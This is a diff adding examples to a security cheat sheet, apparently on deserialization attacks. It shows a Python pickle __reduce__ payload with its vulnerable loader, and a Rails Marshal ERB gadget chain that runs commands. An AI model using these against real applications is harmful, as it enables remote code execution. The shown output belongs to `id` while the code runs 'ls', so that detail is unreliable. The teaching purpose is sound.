@@ -1066,12 +1066,59 @@ HQL injection example (pwn2win 2017)
 - `dumps()` 將物件序列化成字串
 - `loads()` 將字串反序列化
 
+Example:
+
+a.py:
+
 ```python
+import os
+import cPickle
+import sys
+import base64
+
 class Exploit(object):
     def __reduce__(self):
         return (os.system, ('ls',))
+    
+shellcode = cPickle.dumps(Exploit())
+print base64.b64encode(shellcode)
 ```
 
+b.py:
+
+```python
+import os
+import cPickle
+import sys
+import base64
+
+s = raw_input(":")
+
+print cPickle.loads(base64.b64decode(s))
+```
+
+```
+$ python a.py > tmp
+$ cat tmp | python b.py
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
+```
+
+## Ruby/Rails Marshal
+
+this one is not self-executing
+
+this one actually relies on rails invoking a method on the resulting object after the deserialization
+
+```ruby
+erb = ERB.allocate
+erb.instance_variable_set :@src, "`id`"
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, "foo", ActiveSupport::Deprecation
+hash = {depr => 'something'}
+marshalled = Marshal.dump(hash)
+print marshalled
+```
+
+在ERB上，當result或run method被call時，@src的string會被執行
 
 # SSTI 
 
